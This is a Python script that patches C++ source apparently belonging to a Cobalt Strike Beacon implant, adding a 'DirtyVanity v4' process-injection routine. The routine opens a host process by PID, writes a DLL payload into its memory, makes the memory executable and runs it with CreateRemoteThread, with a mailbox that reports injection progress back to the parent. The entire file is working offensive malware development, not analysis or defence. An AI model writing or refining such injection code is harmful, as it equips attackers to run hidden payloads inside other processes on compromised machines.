#!/usr/bin/env python3
"""DirtyVanity v4: PID-addressed host + stage feedback through the mailbox."""
import io

p = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src\inject_tier2.cpp"
s = io.open(p, encoding="utf-8").read()

# mailbox: host handle -> host pid + stage feedback
old = """typedef struct {
	volatile LONG go;
	void * host;      /* suspended host pre-created by the healthy parent;
	                   * the INHERIT_HANDLES fork copies the handle table
	                   * 1:1, so the same VALUE works inside the clone */
	char * payload;   /* dll bytes already mirrored into the clone (RX) */
	int    plen;
	void * param;     /* parameter blob already mirrored (RW) */
	int    plen_arg;
} DV_MAILBOX;"""
assert s.count(old) == 1
s = s.replace(old, """typedef struct {
	volatile LONG go;
	DWORD  host_pid;  /* suspended host pre-created by the healthy parent.
	                   * PID, not handle: the fork's handle-table copy does
	                   * not guarantee value stability, a PID is process-
	                   * global; the clone re-opens it with a raw
	                   * NtOpenProcess */
	char * payload;   /* dll bytes already mirrored into the clone (RX) */
	int    plen;
	void * param;     /* parameter blob already mirrored (RW) */
	int    plen_arg;
	volatile LONG stage;  /* trampoline progress: the parent reads this
	                       * copy back through the clone handle */
	volatile LONG last_st;/* NTSTATUS of the failing call, if any */
} DV_MAILBOX;""")

# trampoline launch: open by pid + stage marks
old2 = s[s.find("static void dv_clone_launch(void * host, char * payload"):s.find("void dv_nursery_trampoline(void * unused) {")]
assert len(old2) > 300
new2 = """static void dv_clone_launch(DWORD host_pid, char * payload, int plen, void * param, int plen_arg) {
	void * remote;
	void * rparam = NULL;
	SIZE_T got = 0;
	DWORD  oldp = 0;
	HANDLE host;
	HANDLE ht;

	if (host_pid == 0) {
		dv_mailbox.stage = 2;
		return;
	}
	dv_mailbox.stage = 10; /* woke */

	/* PROCESS_VM_OPERATION | VM_WRITE | VM_READ | CREATE_THREAD | QUERY */
	host = beacon_OpenProcess(0x1F0FFF, FALSE, host_pid);
	if (host == NULL) {
		dv_mailbox.last_st = (LONG)GetLastError();
		dv_mailbox.stage = 20;
		return;
	}
	dv_mailbox.stage = 21;

	remote = beacon_VirtualAllocEx(host, NULL, (SIZE_T)plen,
	                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (remote == NULL) {
		dv_mailbox.last_st = (LONG)GetLastError();
		dv_mailbox.stage = 30;
		return;
	}
	dv_mailbox.stage = 31;

	if (!beacon_WriteProcessMemory(host, remote, payload, (SIZE_T)plen, &got) || got != (SIZE_T)plen) {
		dv_mailbox.last_st = (LONG)GetLastError();
		dv_mailbox.stage = 40;
		return;
	}
	dv_mailbox.stage = 41;

	beacon_VirtualProtectEx(host, remote, (SIZE_T)plen, PAGE_EXECUTE_READ, &oldp);
	dv_mailbox.stage = 50;

	if (plen_arg > 0) {
		rparam = beacon_VirtualAllocEx(host, NULL, (SIZE_T)plen_arg,
		                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (rparam != NULL) {
			beacon_WriteProcessMemory(host, rparam, param, (SIZE_T)plen_arg, &got);
			dv_mailbox.stage = 51;
		}
	}

	ht = beacon_CreateRemoteThread(host, NULL, 0, (LPTHREAD_START_ROUTINE)remote, rparam, 0, NULL);
	if (ht == NULL) {
		dv_mailbox.last_st = (LONG)GetLastError();
		dv_mailbox.stage = 60;
		return;
	}
	CloseHandle(ht); /* kernel32 close: syscall-thin, no runtime state */
	dv_mailbox.stage = 99; /* launched */
}

"""
s = s.replace(old2, new2)

old3 = """	dv_clone_launch(dv_mailbox.host, dv_mailbox.payload, dv_mailbox.plen,
	                dv_mailbox.param, dv_mailbox.plen_arg);"""
assert s.count(old3) == 1
s = s.replace(old3, """	dv_clone_launch(dv_mailbox.host_pid, dv_mailbox.payload, dv_mailbox.plen,
	                dv_mailbox.param, dv_mailbox.plen_arg);"""
)

# nursery: record the host PID instead of the handle value
old4 = "\t\tdv_mailbox.host = pi.hProcess;"
assert s.count(old4) == 1
s = s.replace(old4, "\t\tdv_mailbox.host_pid = pi.dwProcessId;")

# forkrun: PID into the mailbox + read the stage back through the clone handle
old5 = """	mb.go       = 1;"""
assert s.count(old5) == 1
s = s.replace(old5, """	mb.go       = 1;
	mb.host_pid = dv_host_pid;""")

old6 = """	spawn_log("dv: payload delivered to clone pid=", (long)dv_clone_pid);
	dv_clone_pid = 0; /* one-shot: the handle stays for nothing further */
	return TRUE;"""
assert s.count(old6) == 1
s = s.replace(old6, """	spawn_log("dv: payload delivered to clone pid=", (long)dv_clone_pid);

	/* read the trampoline's progress back through the clone handle (its
	 * mailbox copy carries the stage) - the launcher is otherwise mute */
	{
		int i;
		for (i = 0; i < 20; i++) {
			DV_MAILBOX probe;
			SIZE_T got2 = 0;
			Sleep(150);
			if (beacon_ReadProcessMemory(hc, &dv_mailbox, &probe, sizeof(probe), &got2) && got2 == sizeof(probe)) {
				if (probe.stage >= 99 || probe.stage >= 20) {
					spawn_log("dv: launcher stage=", (long)probe.stage);
					if (probe.stage < 99)
						spawn_log("dv: launcher last_st=", (long)probe.last_st);
					break;
				}
			}
		}
	}

	dv_clone_pid = 0; /* one-shot: the handle stays for nothing further */
	return TRUE;"""
)

# parent-side host pid storage
old7 = "static HANDLE dv_clone_handle = NULL;\nstatic DWORD  dv_clone_pid = 0;"
assert s.count(old7) == 1
s = s.replace(old7, "static HANDLE dv_clone_handle = NULL;\nstatic DWORD  dv_clone_pid = 0;\nstatic DWORD  dv_host_pid = 0;")
old8 = "\t\tdv_mailbox.host_pid = pi.dwProcessId;"
s = s.replace(old8, "\t\tdv_mailbox.host_pid = pi.dwProcessId;\n\t\tdv_host_pid       = pi.dwProcessId;")
io.open(p, "w", encoding="utf-8", newline="").write(s)
print("v4 in")
